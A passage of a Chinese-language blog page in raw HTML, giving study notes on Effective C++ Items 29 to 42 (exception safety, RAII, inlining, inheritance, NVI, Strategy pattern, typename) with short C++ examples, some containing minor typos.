class="keyword">private</span>:</span><br><span class="line">    Mutex mutex;</span><br><span class="line">    Image *bgImage;</span><br><span class="line">    <span class="keyword">int</span> imageChanges;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrettyMenu::changeBackground</span><span class="params">(std::istream &amp;imgSrc)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">lock</span>(&amp;mutex);<span class="comment">// 可能不会被 unlock</span></span><br><span class="line">    <span class="keyword">delete</span> imageChanges;<span class="comment">// 在 delete 后无法恢复</span></span><br><span class="line">    ++imageChanges;<span class="comment">// 命名创建失败，却仍然加一了</span></span><br><span class="line">    bgImage = <span class="keyword">new</span> <span class="built_in">Image</span>(imgSrc);<span class="comment">// 可能分配内存时候报异常</span></span><br><span class="line">    <span class="built_in">unlock</span>(&amp;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当异常被抛出的时候，带有异常安全性的函数会：</p><ul><li><strong>不泄露任何资源</strong>。上述代码可能造成 unlock 的调用不会执行，泄露了资源。</li><li><strong>不允许数据被损坏</strong>。delete 已经将原有的数据损坏且无法复原。</li></ul><p><strong>采用 RAII 的方式解决问题！！！</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrettyMenu</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">changeBackground</span><span class="params">(std::istream &amp;imgSrc)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Mutex mutex;</span><br><span class="line">    std::shared_ptr&lt;Image&gt; bgImage;</span><br><span class="line">    <span class="keyword">int</span> imageChanges;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrettyMenu::changeBackground</span><span class="params">(std::istream &amp;imgSrc)</span> </span>&#123;</span><br><span class="line">    <span class="function">Lock <span class="title">lk1</span><span class="params">(&amp;mutex)</span></span>;<span class="comment">// Lock 的析构函数自动被调用，释放锁资源</span></span><br><span class="line">    bgImage.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">Image</span>(imgSrc));</span><br><span class="line">    ++imageChanges;<span class="comment">// 创建成功才加一</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的方式已经实现了异常安全的强烈保证！但是有一种更通用的技术来实现强烈保证 —— <strong>copy-and-swap</strong>。其基本思想是：<em>为你打算修改的对象（原件）做出一份副本，然后在那个副本身上做一切必要修改。若有任何修改动作抛出异常，原对象仍保持在未改变状态。待所有的改变都成功后，再将修改后的那个副本和原对象在一个不抛出异常的操作中置换（swap）</em>。</p><hr><h3 id="条款-30：透彻了解-inlining-的里里外外"><a href="#条款-30：透彻了解-inlining-的里里外外" class="headerlink" title="条款 30：透彻了解 inlining 的里里外外"></a>条款 30：透彻了解 inlining 的里里外外</h3><blockquote><p>为什么 inline 是一把双刃剑？</p><p>在一天内存有限的机器上，过度热衷 inlining 会造成程序体积太大（对可用空间而言）。即使拥有虚内存，inline 造成的代码膨胀亦会导致额外的换页行为，降低指令高速缓存装置的命中率，以及伴随这些而来的效率损失；</p><p>换个角度说，如果 inline 函数的本体很小，编译器针对“函数本体”所产出的代码可能比针对“函数调用”所产出的代码更小。果真如此，将函数 inlining 确实可能会导致较小的目标代码和较高的高速缓存装置的命中率！</p></blockquote><p>Inline 函数通常一定被置于头文件内，因为大多数构建环境在编译的过程中进行 inlining，而为了将一个 “函数调用” 替换为 “被调用函数的本体”，必须知道那个函数长什么样子。</p><hr><h3 id="条款-31：将文件间的编译依存关系降至最低"><a href="#条款-31：将文件间的编译依存关系降至最低" class="headerlink" title="条款 31：将文件间的编译依存关系降至最低"></a>条款 31：将文件间的编译依存关系降至最低</h3><p>支持 “编译依存性最小化” 的一般构想是：相依于声明式，不要相依于定义式。基于此构想的两种手段是 Handle classes（即 pImpl 技法）和 Interface classes（即虚基类）。</p><hr><h3 id="条款-32：确定你的-public-继承塑模出-is-a-关系"><a href="#条款-32：确定你的-public-继承塑模出-is-a-关系" class="headerlink" title="条款 32：确定你的 public 继承塑模出 is-a 关系"></a>条款 32：确定你的 public 继承塑模出 is-a 关系</h3><p>“public” 继承意味着 <strong>is-a</strong>，适用于 base class 身上的每一件事情一定也适用于 derived classes 身上，因为每一个 derived class 对象也都是一个 base class 对象。</p><hr><h3 id="条款-33：避免遮掩继承而来的名称"><a href="#条款-33：避免遮掩继承而来的名称" class="headerlink" title="条款 33：避免遮掩继承而来的名称"></a>条款 33：避免遮掩继承而来的名称</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mf1</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mf1</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mf2</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">mf3</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">mf3</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">mf1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">mf3</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">mf4</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Derived d; <span class="keyword">int</span> x;</span><br><span class="line">d.<span class="built_in">mf1</span>();<span class="comment">// 没问题，调用 Derived::mf1</span></span><br><span class="line">d.<span class="built_in">mf1</span>(x);<span class="comment">// 错误！因为 Derived::mf1 遮掩了 Base::mf1</span></span><br><span class="line">d.<span class="built_in">mf2</span>();<span class="comment">// 没问题，调用 Base::mf2</span></span><br><span class="line">d.<span class="built_in">mf3</span>();<span class="comment">// 没问题，调用 Derived::mf3</span></span><br><span class="line">d.<span class="built_in">mf3</span>(x);<span class="comment">// 错误！因为 Derived::mf3 遮掩了 Base::mf3</span></span><br></pre></td></tr></table></figure><p>即使函数参数不同，子类内的名称也会遮掩父类内的名称。</p><hr><h3 id="条款-34：区分接口继承和实现继承"><a href="#条款-34：区分接口继承和实现继承" class="headerlink" title="条款 34：区分接口继承和实现继承"></a>条款 34：区分接口继承和实现继承</h3><p><strong>纯虚函数也可以拥有实现</strong>，这点可以用来将接口和实现分离。可以用父类中纯虚函数的实现来表达子类所公有部分的实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AirPlane</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">(<span class="keyword">const</span> AirPort&amp; destination)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AirPlane::fly</span><span class="params">(<span class="keyword">const</span> Airport&amp; destination)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 缺省行为</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 现在的 fly 被分割为两部分：其声明部分是接口，其定义部分是实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModelA</span> :</span> <span class="keyword">public</span> Airplane &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">(<span class="keyword">const</span> Airport&amp; destination)</span> </span>&#123;</span><br><span class="line">        AirPlane::<span class="built_in">fly</span>(destination);<span class="comment">// 公用部分</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModelB</span> :</span> <span class="keyword">public</span> Airplane &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">(<span class="keyword">const</span> Airport&amp; destination)</span> </span>&#123;</span><br><span class="line">        AirPlane::<span class="built_in">fly</span>(destination);<span class="comment">// 公有部分</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-35：考虑-virtual-函数以外的其他选择"><a href="#条款-35：考虑-virtual-函数以外的其他选择" class="headerlink" title="条款 35：考虑 virtual 函数以外的其他选择"></a>条款 35：考虑 virtual 函数以外的其他选择</h3><ol><li>籍由 Non-Virtual Interface 手法实现 Template Method 模式</li></ol><p><strong>模板方法模式</strong>：定义一个操作的算法框架，而将一些步骤延迟到子类中。使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。</p><p>NVI(Non-Virtual Interface) 技法：令客户可以通过 public non-virtual 成员函数简介调用 private virtual 函数，将这个 non-virtual 函数称为 virtual 函数的 wrapper。</p><p>【注意】在 NVI 手法下其实没有必要让 virtual 函数一定得是 private，某些 class 继承体系要求 derived class 在 virtual 函数的实现内必须调用其 base class 的对应兄弟，而为了让这样的调用合法，virtual 函数必须是 protected 的。</p><blockquote><p>例子：在 KLEE 的 Search 继承体系下，Search 作为基类实现了基本的 search 算法框架，即 NotifyListenersSearchStarted，然后在循环内 selectNextState，executeInst，updateNextState，isFinished，出循环后再 NotifyListenersSearchFinished。对于其继承类，必须实现具体的 selectNextState，updateNextState，isFinished 三个虚函数对不同的搜索策略实现具体的算法步骤。</p></blockquote><ol start="2"><li>籍由 Function Pointer 实现 Strategy 模式</li></ol><p><strong>策略模式</strong>：定义一系列的算法，把每一个算法封装起来，并且使它们可相互替换。本模式使得算法可独立于使用它的客户而变化。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 传统的策略模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameCharacter</span>；</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HealthCalcFunc</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">const</span> GameCharacter &amp;gc)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HealthCalcFunc defaultHealthCalc;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameCharacter</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">GameCharacter</span><span class="params">(HealthCalcFunc* phcf = &amp;defaultHealthCalc)</span> </span></span><br><span class="line"><span class="function">        : pHealthCalc(phcf) &#123;</span> &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">healthValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pHealthCalc-&gt;<span class="built_in">calc</span>(*<span class="keyword">this</span>);<span class="comment">// 通过给 pHealthCalc 不同的健康计算算法对象得到不同的健康值计算方式</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">HealthCalcFunc *pHealthCalc;<span class="comment">// 对象指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用<strong>函数指针</strong>来代替算法类（会提高代码的效率，因为虚函数存在运行时开销）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Function Pointer Impletation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameCharacter</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">defaultHealthCalc</span><span class="params">(<span class="keyword">const</span> GameCharacter &amp;gc)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameCharacter</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HealthCalcFunc)</span> <span class="params">(<span class="keyword">const</span> GameCharacter&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">GameCharacter</span><span class="params">(HealthCalcFunc hcf = defaultHealthCalc)</span> </span></span><br><span class="line"><span class="function">        : healthFunc(hcf) &#123;</span> &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">healthValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">healthFunc</span>(*<span class="keyword">this</span>); &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    HealthCalcFunc healthFunc;<span class="comment">// 函数指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-36：绝不重新定义继承而来的-non-virtual-函数"><a href="#条款-36：绝不重新定义继承而来的-non-virtual-函数" class="headerlink" title="条款 36：绝不重新定义继承而来的 non-virtual 函数"></a>条款 36：绝不重新定义继承而来的 non-virtual 函数</h3><p>因为在 class 内声明一个 non-virtual 函数会为该 class 建立起一个不变性（invariant），凌驾其特异性（specialization）。</p><hr><h3 id="条款-37：绝不重新定义继承而来的缺省参数值"><a href="#条款-37：绝不重新定义继承而来的缺省参数值" class="headerlink" title="条款 37：绝不重新定义继承而来的缺省参数值"></a>条款 37：绝不重新定义继承而来的缺省参数值</h3><ol><li>在条款 36 中说明了不要重新定义继承而来的 non-virtual 函数</li><li>对于 virtual 函数，为什么不要重新定义的继承而来的缺省参数值呢？因为缺省参数值都是<strong>静态绑定</strong>，而 virtual 函数却是<strong>动态绑定</strong>。</li></ol><hr><h3 id="条款-38：通过复合塑模出-has-a-或-“根据某物实现出”"><a href="#条款-38：通过复合塑模出-has-a-或-“根据某物实现出”" class="headerlink" title="条款 38：通过复合塑模出 has-a 或 “根据某物实现出”"></a>条款 38：通过复合塑模出 has-a 或 “根据某物实现出”</h3><ul><li>复合的意义和 public 继承完全不同。public 继承是一种 <strong>is-a</strong> 关系。</li><li>在应用域，复合意味着 <strong>has-a</strong>。在实现域，复合意味着 <strong>is-implemented-in-terms-of</strong>。</li></ul><hr><h3 id="条款-39：明智而审慎地使用-private-继承"><a href="#条款-39：明智而审慎地使用-private-继承" class="headerlink" title="条款 39：明智而审慎地使用 private 继承"></a>条款 39：明智而审慎地使用 private 继承</h3><ul><li>Private 继承意味着 is-implemented-in-terms-of。它通常比复合的优先级低，但是当 derived class 需要访问 protected base class 的成员，或需要重新定义继承而来的 virtual 函数时，这么设计是合理的。</li><li>和复合不同，private 继承可以造成 empty base 最优化。这对致力于 “对象尺寸最小化” 的程序库开发者而言可能也很重要。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Emplty</span> &#123;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HoldsAnInt1</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    Empty e;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HoldsAnInt2</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sizeof(HoldsAnInt1) &gt; sizeof(int)</span></span><br><span class="line"><span class="comment">// sizeof(HoldsAnInt2) == sizeof(int)</span></span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="条款-40：明智而审慎地使用多重继承"><a href="#条款-40：明智而审慎地使用多重继承" class="headerlink" title="条款 40：明智而审慎地使用多重继承"></a>条款 40：明智而审慎地使用多重继承</h3><ul><li>virtual 继承会增加大小、速度、初始化复杂度等等成本。如果 virtual base classes 不带任何数据，将是最具实用价值的情况。</li><li>多重继承的确有正当用途。其中一个情节涉及 <strong>“public 继承某个 Interface class”</strong> 和 <strong>“private 继承某个协助实现的 class”</strong> 的两相组合。如下：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IPerson</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">IPerson</span>();</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">name</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">birthDate</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataBaseID</span> &#123;</span> ... &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonInfo</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">PersonInfo</span><span class="params">(DatabaseID pid)</span></span>;</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">PersonInfo</span>();</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">theName</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">theBirthDate</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">valueDelimOpen</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">valueDelimClose</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CPerson 公有继承于接口类 IPerson，私有继承于协助实现类 PersonInfo</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CPerson</span> :</span> <span class="keyword">public</span> IPerson, <span class="keyword">private</span> PersonInfo &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Cperson</span><span class="params">(DatabaseID pid)</span> : PersonInfo(pid) &#123;</span> &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> PersonInfo::<span class="built_in">theName</span>(); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">birthDate</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> PersonInfo::<span class="built_in">theBirthDate</span>(); &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">valueDelimOpen</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">valueDelimClose</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="条款-41：了解隐式接口和编译期多态"><a href="#条款-41：了解隐式接口和编译期多态" class="headerlink" title="条款 41：了解隐式接口和编译期多态"></a>条款 41：了解隐式接口和编译期多态</h3><p>classes 和 template 都支持接口和多态。对 classes 而言接口是显示的，以函数签名为中心，多态则是通过 virtual 函数发生在运行期。对 template 参数而言，接口是隐式的，奠基于有效表达式，多态则是通过 template 具现化和函数重载解析发生于编译期。</p><hr><h3 id="条款-42：了解-typename-的双重意义"><a href="#条款-42：了解-typename-的双重意义" class="headerlink" title="条款 42：了解 typename 的双重意义"></a>条款 42：了解 typename 的双重意义</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 以下代码无法通过编译</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> C&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2nd</span><span class="params">(<span class="keyword">const</span> C&amp; container)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (container.<span class="built_in">size</span>() &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="function">C::const_iterator <span class="title">iter</span><span class="params">(container.begin())</span></span>;</span><br><span class="line">        ++iter;</span><br><span class="line">        <span class="keyword">int</span> value = *iter;</span><br><span class="line">        std::cout &lt;&lt; value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>模板内出现的名称如果相依于某个模板参数，则称之为<strong>从属名称</strong>。</p></li><li><p>如果从属名称在 class 内呈嵌套状，则称之为<strong>嵌套从属名称</strong>。如上述代码中的 <code>C::const_iterator</code>。</p></li><li><p>如果嵌套从属名称还指涉某个类型，则称之为<strong>嵌套从属类型名称</strong>。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 嵌套从属名称有可能会导致解析困难。如下代码中，C::const_iterator可以是一个类型，用来声明x为一个local指针变量；其也可以是一个变量，表示和x相乘。此处会造成二义性。</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;typaname C&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2nd</span><span class="params">(<span class="keyword">const</span> C&amp; container)</span> </span>&#123;</span><br><span class="line">    C::const_iterator* x;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>C++ 在处理这种二义性时候的方式：<strong>如果解析器在模板中遭遇到一个嵌套从属名称，它边假设这个名称不是一个类型，除非你告诉它是。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// 例外：typename 不可以出现在base class list内的嵌套从属类型名称之前，也不可在member initialization list(成员初值列)中作为base class修饰符。</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base&lt;T&gt;::Nested &#123;<span class="comment">/// base class list中不允许typename</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Derived</span><span class="params">(<span class="keyword">int</span> x)</span> : Base&lt;T&gt;：：Nested(x) &#123;</span><span class="comment">/// mem.init.list中不允许typename</span></span><br><span class="line">        <span class="keyword">typename</span> Base&lt;T&gt;::Nested temp;<span class="comment">/// 必须加上typename</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>一般性规则：<strong>任何时候想要在模板中指涉一个嵌套从属类型名称，就必须在紧临它的前一个位置加上关键字 typename。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> C&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2nd</span><span class="params">(<span class="keyword">const</span> C&amp; container)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (container.<span class="built_in">size</span>() &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">typename</span> C::const_iterator <span class="title">iter</span><span class="params">(container.begin())</span></span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="条款-43：学习处理模板化基类内的名称"><a href="#条款-43：学习处理模板化基类内的名称" class="headerlink" 